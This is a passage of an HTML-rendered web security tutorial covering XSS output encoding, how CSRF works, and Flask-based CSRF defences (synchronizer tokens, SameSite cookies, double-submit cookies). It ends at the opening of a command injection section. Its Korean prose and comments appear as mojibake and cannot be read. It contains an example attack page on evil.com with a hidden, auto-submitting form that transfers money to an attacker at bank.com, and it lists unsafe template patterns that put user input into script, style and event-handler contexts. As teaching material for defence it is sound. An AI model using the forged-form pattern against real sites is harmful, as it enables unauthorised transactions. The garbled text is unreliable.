<span class="w">    </span><span class="sd">&quot;&quot;&quot;HTML body ì»¨í…ìŠ¤íŠ¸ìš© ì¸ì½”ë”©.&quot;&quot;&quot;</span>
    <span class="k">return</span> <span class="n">html</span><span class="o">.</span><span class="n">escape</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
    <span class="c1"># &lt; â†’ &amp;lt;  &gt; â†’ &amp;gt;  &amp; â†’ &amp;amp;  &quot; â†’ &amp;quot;  &#39; â†’ &amp;#x27;</span>


<span class="k">def</span><span class="w"> </span><span class="nf">encode_for_html_attribute</span><span class="p">(</span><span class="n">value</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;HTML attribute ì»¨í…ìŠ¤íŠ¸ìš© ì¸ì½”ë”©.&quot;&quot;&quot;</span>
    <span class="k">return</span> <span class="n">html</span><span class="o">.</span><span class="n">escape</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="n">quote</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>


<span class="k">def</span><span class="w"> </span><span class="nf">encode_for_javascript</span><span class="p">(</span><span class="n">value</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;JavaScript ë¬¸ìì—´ ì»¨í…ìŠ¤íŠ¸ìš© ì¸ì½”ë”©.&quot;&quot;&quot;</span>
    <span class="c1"># json.dumpsê°€ ë”°ì˜´í‘œ ì¶”ê°€ ë° íŠ¹ìˆ˜ ë¬¸ì ì´ìŠ¤ì¼€ì´í”„</span>
    <span class="k">return</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
    <span class="c1"># ì²˜ë¦¬: \n, \r, \t, \&quot;, \\, unicode ë¬¸ì</span>


<span class="k">def</span><span class="w"> </span><span class="nf">encode_for_url</span><span class="p">(</span><span class="n">value</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;URL ë§¤ê°œë³€ìˆ˜ ì»¨í…ìŠ¤íŠ¸ìš© ì¸ì½”ë”©.&quot;&quot;&quot;</span>
    <span class="k">return</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="n">safe</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>


<span class="c1"># Flask/Jinja2 í…œí”Œë¦¿ì—ì„œ ì‚¬ìš©:</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="sd">&lt;!-- HTML ì»¨í…ìŠ¤íŠ¸ (Jinja2 ìë™ ì´ìŠ¤ì¼€ì´í”„) --&gt;</span>
<span class="sd">&lt;p&gt;{{ user_input }}&lt;/p&gt;</span>

<span class="sd">&lt;!-- HTML ì†ì„± (Jinja2 ìë™ ì´ìŠ¤ì¼€ì´í”„) --&gt;</span>
<span class="sd">&lt;div title=&quot;{{ user_input }}&quot;&gt;</span>

<span class="sd">&lt;!-- JavaScript ì»¨í…ìŠ¤íŠ¸ (tojson í•„í„° ì‚¬ìš©) --&gt;</span>
<span class="sd">&lt;script&gt;</span>
<span class="sd">var data = {{ user_input|tojson }};</span>
<span class="sd">&lt;/script&gt;</span>

<span class="sd">&lt;!-- URL ì»¨í…ìŠ¤íŠ¸ --&gt;</span>
<span class="sd">&lt;a href=&quot;/search?q={{ user_input|urlencode }}&quot;&gt;Search&lt;/a&gt;</span>

<span class="sd">&lt;!-- ìœ„í—˜: ì´ëŸ¬í•œ ì»¨í…ìŠ¤íŠ¸ì— ì‚¬ìš©ì ì…ë ¥ì„ ì§ì ‘ ë„£ì§€ ë§ ê²ƒ --&gt;</span>
<span class="sd">&lt;!-- &lt;script&gt;{{ user_input }}&lt;/script&gt;            ì ˆëŒ€ ì•ˆ ë¨ --&gt;</span>
<span class="sd">&lt;!-- &lt;div onmouseover=&quot;{{ user_input }}&quot;&gt;         ì ˆëŒ€ ì•ˆ ë¨ --&gt;</span>
<span class="sd">&lt;!-- &lt;style&gt;{{ user_input }}&lt;/style&gt;               ì ˆëŒ€ ì•ˆ ë¨ --&gt;</span>
<span class="sd">&quot;&quot;&quot;</span>
</code></pre></div>

<hr />
<h2 id="4-cross-site-request-forgery-csrf">4. Cross-Site Request Forgery (CSRF)<a class="header-link" href="#4-cross-site-request-forgery-csrf" title="Permanent link">&para;</a></h2>
<h3 id="41-csrf">4.1 CSRF ì‘ë™ ë°©ì‹<a class="header-link" href="#41-csrf" title="Permanent link">&para;</a></h3>
<p>CSRFëŠ” ë¡œê·¸ì¸í•œ ì‚¬ìš©ìì˜ ë¸Œë¼ìš°ì €ë¥¼ ì†ì—¬ ì‚¬ìš©ìì˜ ê¸°ì¡´ ì„¸ì…˜ ì¿ í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ì·¨ì•½í•œ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ìœ„ì¡°ëœ ìš”ì²­ì„ ë³´ë‚´ê²Œ í•©ë‹ˆë‹¤.</p>
<div class="highlight"><pre><span></span><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚<span class="w">              </span>Cross-Site<span class="w"> </span>Request<span class="w"> </span>Forgery<span class="w"> </span>(CSRF)<span class="w">                   </span>â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>1.<span class="w"> </span>ì‚¬ìš©ìê°€<span class="w"> </span>bank.comì—<span class="w"> </span>ë¡œê·¸ì¸<span class="w"> </span>(ì„¸ì…˜<span class="w"> </span>ì¿ í‚¤<span class="w"> </span>ì„¤ì •)<span class="w">                   </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>2.<span class="w"> </span>ì‚¬ìš©ìê°€<span class="w"> </span>evil.com<span class="w"> </span>ë°©ë¬¸<span class="w"> </span>(ë‹¤ë¥¸<span class="w"> </span>íƒ­ì—ì„œ)<span class="w">                          </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>3.<span class="w"> </span>evil.comì—<span class="w"> </span>í¬í•¨ëœ<span class="w"> </span>ë‚´ìš©:<span class="w">                                       </span>â”‚
â”‚<span class="w">     </span><span class="nt">&lt;form</span><span class="w"> </span><span class="na">action=</span><span class="s">&quot;https://bank.com/transfer&quot;</span><span class="w"> </span><span class="na">method=</span><span class="s">&quot;POST&quot;</span><span class="nt">&gt;</span><span class="w">    </span>â”‚
â”‚<span class="w">       </span><span class="nt">&lt;input</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;hidden&quot;</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;to&quot;</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;attacker&quot;</span><span class="nt">&gt;</span><span class="w">         </span>â”‚
â”‚<span class="w">       </span><span class="nt">&lt;input</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;hidden&quot;</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;amount&quot;</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;10000&quot;</span><span class="nt">&gt;</span><span class="w">        </span>â”‚
â”‚<span class="w">     </span><span class="nt">&lt;/form&gt;</span><span class="w">                                                      </span>â”‚
â”‚<span class="w">     </span><span class="nt">&lt;script&gt;</span>document.forms[0].submit()<span class="nt">&lt;/script&gt;</span><span class="w">                 </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>4.<span class="w"> </span>ë¸Œë¼ìš°ì €ê°€<span class="w"> </span>bank.comìœ¼ë¡œ<span class="w"> </span>í¼<span class="w"> </span>POST<span class="w"> </span>ì „ì†¡<span class="w">                          </span>â”‚
â”‚<span class="w">     </span>ì‚¬ìš©ìì˜<span class="w"> </span>ì„¸ì…˜<span class="w"> </span>ì¿ í‚¤ì™€<span class="w"> </span>í•¨ê»˜<span class="w"> </span>(ìë™)<span class="w">                              </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>5.<span class="w"> </span>bank.comì´<span class="w"> </span>ìœ íš¨í•˜ê³ <span class="w"> </span>ì¸ì¦ëœ<span class="w"> </span>ìš”ì²­ì„<span class="w"> </span>ë°›ìŒ<span class="w">                        </span>â”‚
â”‚<span class="w">     </span>ê³µê²©ìì—ê²Œ<span class="w"> </span>$10,000<span class="w"> </span>ì†¡ê¸ˆ<span class="w">                                       </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>â”Œâ”€â”€â”€â”€â”€â”€â”<span class="w">    </span>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<span class="w">    </span>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<span class="w">                      </span>â”‚
â”‚<span class="w">  </span>â”‚í”¼í•´ìâ”‚â”€â”€â”€â–¶â”‚<span class="w"> </span>evil.com<span class="w"> </span>â”‚â”€â”€â”€â–¶â”‚<span class="w"> </span>bank.com<span class="w"> </span>â”‚<span class="w">                      </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w">      </span>â”‚<span class="w">    </span>â”‚<span class="w"> </span>(ìˆ¨ê²¨ì§„<span class="w">  </span>â”‚<span class="w">    </span>â”‚<span class="w"> </span>(ì¿ í‚¤<span class="w">    </span>â”‚<span class="w">                      </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w">      </span>â”‚<span class="w">    </span>â”‚<span class="w">  </span>í¼)<span class="w">     </span>â”‚<span class="w">    </span>â”‚<span class="w">  </span>ì‹ ë¢°)<span class="w">   </span>â”‚<span class="w">                      </span>â”‚
â”‚<span class="w">  </span>â””â”€â”€â”€â”€â”€â”€â”˜<span class="w">    </span>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<span class="w">    </span>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<span class="w">                      </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>ì‘ë™í•˜ëŠ”<span class="w"> </span>ì´ìœ :<span class="w">                                                   </span>â”‚
â”‚<span class="w">  </span>-<span class="w"> </span>ë¸Œë¼ìš°ì €ê°€<span class="w"> </span>ëª¨ë“ <span class="w"> </span>ìš”ì²­ì—<span class="w"> </span>ì¿ í‚¤ë¥¼<span class="w"> </span>ìë™ìœ¼ë¡œ<span class="w"> </span>ë³´ëƒ„<span class="w">                     </span>â”‚
â”‚<span class="w">  </span>-<span class="w"> </span>ì„œë²„ëŠ”<span class="w"> </span>ì‚¬ìš©ìê°€<span class="w"> </span>ì‹œì‘í•œ<span class="w"> </span>ìš”ì²­ê³¼<span class="w"> </span>ìœ„ì¡°ëœ<span class="w"> </span>ìš”ì²­ì„<span class="w"> </span>êµ¬ë³„í• <span class="w"> </span>ìˆ˜<span class="w"> </span>ì—†ìŒ<span class="w">      </span>â”‚
â”‚<span class="w">    </span>(ë‘˜<span class="w"> </span>ë‹¤<span class="w"> </span>ìœ íš¨í•œ<span class="w"> </span>ì¿ í‚¤ë¥¼<span class="w"> </span>ê°€ì§€ê³ <span class="w"> </span>ìˆìŒ)<span class="w">                              </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre></div>

<h3 id="42-csrf">4.2 CSRF ë°©ì§€<a class="header-link" href="#42-csrf" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">csrf_prevention.py - CSRF ë°©ì–´ êµ¬í˜„</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">secrets</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">hmac</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">abort</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">functools</span><span class="w"> </span><span class="kn">import</span> <span class="n">wraps</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
<span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">secrets</span><span class="o">.</span><span class="n">token_hex</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># ë°©ë²• 1: ë™ê¸°í™” í† í° íŒ¨í„´</span>
<span class="c1"># ==============================================================</span>

<span class="k">def</span><span class="w"> </span><span class="nf">generate_csrf_token</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;CSRF í† í°ì„ ìƒì„±í•˜ê³  ì„¸ì…˜ì— ì €ì¥.&quot;&quot;&quot;</span>
    <span class="k">if</span> <span class="s1">&#39;csrf_token&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
        <span class="n">session</span><span class="p">[</span><span class="s1">&#39;csrf_token&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">secrets</span><span class="o">.</span><span class="n">token_hex</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;csrf_token&#39;</span><span class="p">]</span>


<span class="c1"># ëª¨ë“  í…œí”Œë¦¿ì—ì„œ csrf_tokenì„ ì‚¬ìš© ê°€ëŠ¥í•˜ê²Œ ë§Œë“¦</span>
<span class="n">app</span><span class="o">.</span><span class="n">jinja_env</span><span class="o">.</span><span class="n">globals</span><span class="p">[</span><span class="s1">&#39;csrf_token&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">generate_csrf_token</span>


<span class="k">def</span><span class="w"> </span><span class="nf">csrf_protect</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;CSRF í† í° ê²€ì¦ì„ ê°•ì œí•˜ëŠ” ë°ì½”ë ˆì´í„°.&quot;&quot;&quot;</span>
    <span class="nd">@wraps</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">decorated</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="ow">in</span> <span class="p">(</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;PUT&#39;</span><span class="p">,</span> <span class="s1">&#39;DELETE&#39;</span><span class="p">,</span> <span class="s1">&#39;PATCH&#39;</span><span class="p">):</span>
            <span class="c1"># í¼ ë°ì´í„° ë˜ëŠ” í—¤ë”ì—ì„œ í† í° í™•ì¸</span>
            <span class="n">token</span> <span class="o">=</span> <span class="p">(</span>
                <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;csrf_token&#39;</span><span class="p">)</span> <span class="ow">or</span>
                <span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;X-CSRF-Token&#39;</span><span class="p">)</span>
            <span class="p">)</span>
            <span class="n">expected</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;csrf_token&#39;</span><span class="p">)</span>

            <span class="k">if</span> <span class="ow">not</span> <span class="n">token</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">expected</span><span class="p">:</span>
                <span class="n">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">,</span> <span class="n">description</span><span class="o">=</span><span class="s2">&quot;CSRF token missing&quot;</span><span class="p">)</span>

            <span class="c1"># íƒ€ì´ë° ê³µê²© ë°©ì§€ë¥¼ ìœ„í•œ ìƒìˆ˜ ì‹œê°„ ë¹„êµ</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">hmac</span><span class="o">.</span><span class="n">compare_digest</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">expected</span><span class="p">):</span>
                <span class="n">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">,</span> <span class="n">description</span><span class="o">=</span><span class="s2">&quot;CSRF token invalid&quot;</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">f</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">decorated</span>


<span class="c1"># í…œí”Œë¦¿ì—ì„œ ì‚¬ìš©:</span>
<span class="n">TRANSFER_FORM</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">&lt;html&gt;</span>
<span class="s2">&lt;body&gt;</span>
<span class="s2">    &lt;h1&gt;Transfer Money&lt;/h1&gt;</span>
<span class="s2">    &lt;form method=&quot;POST&quot; action=&quot;/transfer&quot;&gt;</span>
<span class="s2">        &lt;!-- ìˆ¨ê²¨ì§„ í•„ë“œë¡œ CSRF í† í° --&gt;</span>
<span class="s2">        &lt;input type=&quot;hidden&quot; name=&quot;csrf_token&quot; value=&quot;{{ csrf_token() }}&quot;&gt;</span>
<span class="s2">        &lt;label&gt;To: &lt;input type=&quot;text&quot; name=&quot;to&quot;&gt;&lt;/label&gt;</span>
<span class="s2">        &lt;label&gt;Amount: &lt;input type=&quot;number&quot; name=&quot;amount&quot;&gt;&lt;/label&gt;</span>
<span class="s2">        &lt;button type=&quot;submit&quot;&gt;Transfer&lt;/button&gt;</span>
<span class="s2">    &lt;/form&gt;</span>
<span class="s2">&lt;/body&gt;</span>
<span class="s2">&lt;/html&gt;</span>
<span class="s2">&quot;&quot;&quot;</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/transfer&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="nd">@csrf_protect</span>
<span class="k">def</span><span class="w"> </span><span class="nf">transfer</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;GET&#39;</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">TRANSFER_FORM</span><span class="p">)</span>

    <span class="c1"># POST - CSRF í† í°ì´ ë°ì½”ë ˆì´í„°ì— ì˜í•´ ê²€ì¦ë¨</span>
    <span class="n">to</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;to&#39;</span><span class="p">)</span>
    <span class="n">amount</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;amount&#39;</span><span class="p">)</span>
    <span class="c1"># ì†¡ê¸ˆ ì²˜ë¦¬...</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;transferred&quot;</span><span class="p">})</span>


<span class="c1"># AJAX ìš”ì²­ì˜ ê²½ìš° í—¤ë”ì— í† í° í¬í•¨:</span>
<span class="n">AJAX_EXAMPLE</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">&lt;script&gt;</span>
<span class="s2">// ë©”íƒ€ íƒœê·¸ë‚˜ ì¿ í‚¤ì—ì„œ í† í° ê°€ì ¸ì˜¤ê¸°</span>
<span class="s2">var csrfToken = document.querySelector(&#39;meta[name=&quot;csrf-token&quot;]&#39;).content;</span>

<span class="s2">fetch(&#39;/api/transfer&#39;, {</span>
<span class="s2">    method: &#39;POST&#39;,</span>
<span class="s2">    headers: {</span>
<span class="s2">        &#39;Content-Type&#39;: &#39;application/json&#39;,</span>
<span class="s2">        &#39;X-CSRF-Token&#39;: csrfToken  // í—¤ë”ì— í† í° ì „ì†¡</span>
<span class="s2">    },</span>
<span class="s2">    body: JSON.stringify({to: &#39;bob&#39;, amount: 100})</span>
<span class="s2">});</span>
<span class="s2">&lt;/script&gt;</span>
<span class="s2">&quot;&quot;&quot;</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># ë°©ë²• 2: SameSite ì¿ í‚¤ (ì‹¬ì¸µ ë°©ì–´)</span>
<span class="c1"># ==============================================================</span>

<span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="o">.</span><span class="n">update</span><span class="p">(</span>
    <span class="n">SESSION_COOKIE_SAMESITE</span><span class="o">=</span><span class="s1">&#39;Lax&#39;</span><span class="p">,</span>   <span class="c1"># êµì°¨ ì‚¬ì´íŠ¸ POSTì—ì„œ ì¿ í‚¤ ì „ì†¡ ì•ˆ í•¨</span>
    <span class="n">SESSION_COOKIE_SECURE</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>       <span class="c1"># HTTPSë§Œ</span>
    <span class="n">SESSION_COOKIE_HTTPONLY</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>      <span class="c1"># JavaScript ì ‘ê·¼ ë¶ˆê°€</span>
<span class="p">)</span>

<span class="c1"># SameSite ê°’:</span>
<span class="c1"># &#39;Strict&#39; - êµì°¨ ì‚¬ì´íŠ¸ ìš”ì²­ì—ì„œ ì¿ í‚¤ê°€ ì ˆëŒ€ ì „ì†¡ë˜ì§€ ì•ŠìŒ</span>
<span class="c1">#            (&quot;Googleë¡œ ë¡œê·¸ì¸&quot; ìœ í˜•ì˜ í”Œë¡œìš°ê°€ ì‘ë™í•˜ì§€ ì•ŠìŒ)</span>
<span class="c1"># &#39;Lax&#39;    - ìµœìƒìœ„ GET íƒìƒ‰ì—ì„œëŠ” ì¿ í‚¤ê°€ ì „ì†¡ë˜ì§€ë§Œ</span>
<span class="c1">#            êµì°¨ ì‚¬ì´íŠ¸ POST/PUT/DELETEì—ì„œëŠ” ì „ì†¡ë˜ì§€ ì•ŠìŒ (ê¶Œì¥ ê¸°ë³¸ê°’)</span>
<span class="c1"># &#39;None&#39;   - ì¿ í‚¤ê°€ í•­ìƒ ì „ì†¡ë¨ (Secure í”Œë˜ê·¸ í•„ìš”)</span>
<span class="c1">#            (êµì°¨ ì‚¬ì´íŠ¸ ì¸ì¦ ìš”ì²­ì— í•„ìš”)</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># ë°©ë²• 3: Double Submit Cookie</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/transfer&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">api_transfer</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    Double Submit Cookie íŒ¨í„´:</span>
<span class="sd">    1. ì„œë²„ê°€ ì¿ í‚¤ì— ì„ì˜ì˜ ê°’ ì„¤ì •</span>
<span class="sd">    2. í´ë¼ì´ì–¸íŠ¸ëŠ” í—¤ë”ì— ë™ì¼í•œ ê°’ì„ ë³´ë‚´ì•¼ í•¨</span>
<span class="sd">    3. ê³µê²©ìëŠ” ì¿ í‚¤ ê°’ì„ ì½ì„ ìˆ˜ ì—†ìŒ (ë™ì¼ ì¶œì²˜ ì •ì±…)</span>
<span class="sd">    &quot;&quot;&quot;</span>
    <span class="n">cookie_token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;csrf_token&#39;</span><span class="p">)</span>
    <span class="n">header_token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;X-CSRF-Token&#39;</span><span class="p">)</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">cookie_token</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">header_token</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;CSRF token missing&quot;</span><span class="p">}),</span> <span class="mi">403</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">hmac</span><span class="o">.</span><span class="n">compare_digest</span><span class="p">(</span><span class="n">cookie_token</span><span class="p">,</span> <span class="n">header_token</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;CSRF token mismatch&quot;</span><span class="p">}),</span> <span class="mi">403</span>

    <span class="c1"># ìš”ì²­ ì²˜ë¦¬...</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;success&quot;</span><span class="p">})</span>
</code></pre></div>

<h3 id="43-csrf">4.3 CSRF ë°©ì§€ ìš”ì•½<a class="header-link" href="#43-csrf" title="Permanent link">&para;</a></h3>
<table>
<thead>
<tr>
<th>ë°©ë²•</th>
<th>ì‘ë™ ë°©ì‹</th>
<th>ì¥ì </th>
<th>ë‹¨ì </th>
</tr>
</thead>
<tbody>
<tr>
<td>ë™ê¸°í™” í† í°</td>
<td>ì„¸ì…˜ì˜ ì„ì˜ í† í° + í¼</td>
<td>ê°•ë ¥, ë„ë¦¬ ì§€ì›ë¨</td>
<td>ì„œë²„ ì¸¡ ì„¸ì…˜ í•„ìš”</td>
</tr>
<tr>
<td>SameSite ì¿ í‚¤</td>
<td>ë¸Œë¼ìš°ì €ê°€ êµì°¨ ì‚¬ì´íŠ¸ ì¿ í‚¤ ì°¨ë‹¨</td>
<td>ê°„ë‹¨, ì½”ë“œ ë³€ê²½ ë¶ˆí•„ìš”</td>
<td>ì˜¤ë˜ëœ ë¸Œë¼ìš°ì € ì§€ì›, ì‹¬ì¸µ ë°©ì–´ë§Œ</td>
</tr>
<tr>
<td>Double Submit Cookie</td>
<td>ì¿ í‚¤ì˜ í† í° + í—¤ë”ê°€ ì¼ì¹˜í•´ì•¼ í•¨</td>
<td>ë¬´ìƒíƒœ</td>
<td>í•˜ìœ„ ë„ë©”ì¸ì´ ì¹¨í•´ë˜ë©´ ì·¨ì•½</td>
</tr>
<tr>
<td>ì‚¬ìš©ì ì •ì˜ í—¤ë”</td>
<td>ì‚¬ìš©ì ì •ì˜ í—¤ë” í•„ìš” (ì˜ˆ: X-Requested-With)</td>
<td>AJAXì— ê°„ë‹¨</td>
<td>AJAX ìš”ì²­ì—ë§Œ ì‘ë™</td>
</tr>
<tr>
<td>Origin/Referer í™•ì¸</td>
<td>ìš”ì²­ ì¶œì²˜ê°€ ì˜ˆìƒê³¼ ì¼ì¹˜í•˜ëŠ”ì§€ í™•ì¸</td>
<td>ì‹¬ì¸µ ë°©ì–´</td>
<td>í”„ë¡ì‹œì— ì˜í•´ ì œê±°ë  ìˆ˜ ìˆìŒ</td>
</tr>
</tbody>
</table>
<hr />
<h2 id="5-command-injection">5. Command Injection<a class="header-link" href="#5-command-injection" title="Permanent link">&para;</a></h2>
<h3 id="51-command-injection">5.1 Command Injection ì‘ë™ ë°©ì‹<a class="header-link" href="#51-command-injection" title="Permanent link">&para;</a></h3>
